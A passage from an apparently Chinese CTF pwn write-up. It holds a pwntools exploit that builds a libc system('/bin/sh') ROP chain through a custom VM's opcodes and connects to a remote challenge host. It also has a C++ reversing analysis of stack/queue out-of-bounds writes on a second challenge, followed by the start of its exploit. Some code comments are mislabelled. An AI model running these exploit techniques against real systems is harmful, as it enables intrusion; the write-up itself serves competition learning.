+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so.6&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ld</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./ld-2.35.so&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>DEBUG</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;47.94.1.14&#34;</span><span class=p>,</span> <span class=mi>28709</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2+r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sub</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2-r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>2</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mul</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2/r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>3</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>div</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2*r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>4</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2^r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>5</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bitand</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2&amp;r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>6</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bitand</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2/r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>6</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shr</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2&gt;&gt;r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>8</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shl</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r1 = r2&lt;&lt;r3</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>7</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r3</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>store</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>offset</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># s[reg[r2]+offset]=reg[r1]</span>
+</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>offset</span> <span class=o>&lt;=</span> <span class=mh>0xFFF</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>9</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>offset</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>load</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>offset</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># reg[r1] = s[reg[r2]+offset]</span>
+</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>offset</span> <span class=o>&lt;=</span> <span class=mh>0xFFF</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mi>10</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>offset</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r2</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>|</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_num</span><span class=p>(</span><span class=n>r1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>num</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>opcode</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=o>-</span><span class=n>num</span>
+</span></span><span class=line><span class=cl>    <span class=n>tmp1</span> <span class=o>=</span> <span class=n>num</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>num</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>num</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>tmp</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>tmp</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=n>num</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>test</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>tmp</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>test</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>            <span class=n>opcode</span> <span class=o>+=</span> <span class=n>add</span><span class=p>(</span><span class=n>r2</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>test</span> <span class=o>=</span> <span class=n>test</span> <span class=o>*</span> <span class=mi>2</span>
+</span></span><span class=line><span class=cl>        <span class=n>opcode</span> <span class=o>+=</span> <span class=n>shl</span><span class=p>(</span><span class=n>r2</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>tmp</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>test</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>        <span class=n>opcode</span> <span class=o>+=</span> <span class=n>add</span><span class=p>(</span><span class=n>r2</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=n>r1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># assert test == num</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;test: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>test</span><span class=p>)</span><span class=si>}</span><span class=s2> num: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>tmp1</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>opcode</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invalid</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p32</span><span class=p>((</span><span class=mh>0xB</span> <span class=o>&lt;&lt;</span> <span class=mi>28</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>r</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>dbg</span><span class=p>(</span><span class=s2>&#34;b *$rebase(0x1aad)</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x000000000002A3E5</span>
+</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=mh>0x22EC7C</span>
+</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=mh>0x29D90</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset_rdi</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>-</span> <span class=n>pop_rdi</span>
+</span></span><span class=line><span class=cl>    <span class=n>str_bin_sh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset_bin_sh</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>-</span> <span class=n>str_bin_sh</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset_system</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset_puts</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>opcode</span> <span class=o>=</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=n>load</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>load</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0xD38</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>load</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x278</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>gen_num</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>offset_rdi</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>store</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x118</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>gen_num</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=n>offset_bin_sh</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>6</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>store</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x118</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>gen_num</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=n>offset_system</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>add</span><span class=p>(</span><span class=mi>9</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>store</span><span class=p>(</span><span class=mi>9</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x118</span> <span class=o>+</span> <span class=mi>3</span> <span class=o>*</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>add</span><span class=p>(</span><span class=mi>31</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>store</span><span class=p>(</span><span class=mi>31</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x118</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>*</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>opcode</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>    <span class=c1># reg3 = 1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># gets = addr -  0x1b0b20</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;opcode: &#34;</span><span class=p>,</span> <span class=n>opcode</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># good luck pwning :)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></div><h3 id=anyip>anyip<a hidden class=anchor aria-hidden=true href=#anyip>#</a></h3><p>完全不会C++，逆向上遇到了很大的困难，结合正向写C++代码再逆向查看，对比题目中的逆向结果，最后十分钟终于连蒙带猜调通了。
+<img loading=lazy src=/ccbciscn-12.png alt></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>pack</span><span class=p>(</span><span class=n>func</span><span class=p>,</span> <span class=n>para1</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=n>func</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=n>para1</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00\x00\x00\x01\x07\x00\x00</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>+=</span> <span class=n>content</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>buf</span>
+</span></span></code></pre></div><p>前16位代表要调用的函数，取值为0x1111,0x2222,0x3333,0x4444，代表四个函数。</p><p>它后面的8位是函数的一个参数，是一个选项，。再后面的8位固定为b"\x??\x??\x??\x??\x01\x07\x??\x??"。如果其中的\x01和\x07不对会直接报错。
+<img loading=lazy src=/ccbciscn-4.png alt>
+再后面的content为可变长度的字节流，也会作为部分函数的参数。</p><p>然后是func的逆向：</p><p>0x2222是一个栈：
+<img loading=lazy src=/ccbciscn-5.png alt>
+注意到在pop时，对top并没有检查，也就是说在栈空之后可以继续pop实现溢出。而stack的前面有queue及其队头队尾，将栈pop到q_end的位置后再push入数字就可以覆盖q_end。
+<img loading=lazy src=/ccbciscn-6.png alt>
+0x4444是一个队列：
+<img loading=lazy src=/ccbciscn-7.png alt></p><p>q_end = (q_end+1) %10是入队之后才会进行的，也就是说q_end被覆盖后的第一次入队，偏移完全由刚刚越界push的数字决定。但由于只有一次，不能完整覆盖s。但是发现栈对top的唯一检查就是top- base != 0xa, 所以只要把base覆盖掉，栈就可以任意偏移写了。</p><p>下面有一个字符数组s，其中存的是log文件的名字，func 0x1111中有将log读出并发送的功能，所以如果通过栈的任意偏移写将log的名字覆盖成flag，再用func 0x1111中的功能就可以得到flag了。
+<img loading=lazy src=/ccbciscn-8.png alt>
+但是想要使用这个功能，还要让v13=&ldquo;SomeIpfun&rdquo;.</p><p>逆向+尝试后发现v13是一个c++ string，其内容是逐字符拼接而来，而字符的来源与qword_9040中存的堆块有关。
+<img loading=lazy src=/ccbciscn-9.png alt>
+逆向，发现使用func 0x3333中的功能可以修改qword_9040，并且发现它是类似树的结构(完全没看懂，只是看到一个堆块里存了一个字母和两个指针)，使用func 0x3333的功能3可以设置新堆块，功能1可以增加字符，大致以树链表的形式，但是没有看懂具体逻辑。总之添加了一堆字符之后发现拼接出了乱序字符串。</p><p>于是想到一个办法，先按SomeIpfun的顺序输出，发现拼接出的字符串是uenoISpmf
+一一对应：</p><p>S o m e I p f u n</p><p>u e n o I S p m f</p><p>以u来说，第八个输入的u会在第一个输出，而目标是让S第一个输出，所以只要把输入时的u改成S即可。以此类推，修改顺序为：</p><p>peuoIfnSm，得到的字符串就是SomeIpfun了。</p><p>有一个小插曲：c++的字符串不用\x00结尾，如果加了反而会让长度增加导致compare结果不相等。
+<img loading=lazy src=/ccbciscn-10.png alt>
+总结以上利用，写出exp：</p><ol><li><p>用栈的负向溢出覆盖q_end</p></li><li><p>用queue越界覆盖stack的base，让栈绕过边界检查</p></li><li><p>用stack越界覆盖s，将文件名改成flag</p></li><li><p>通过func0x3333和0x1111中的功能，构造字符串"SomeIpfun", 得到flag（在发回的报文中）</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./pwn_patched&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>DEBUG</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
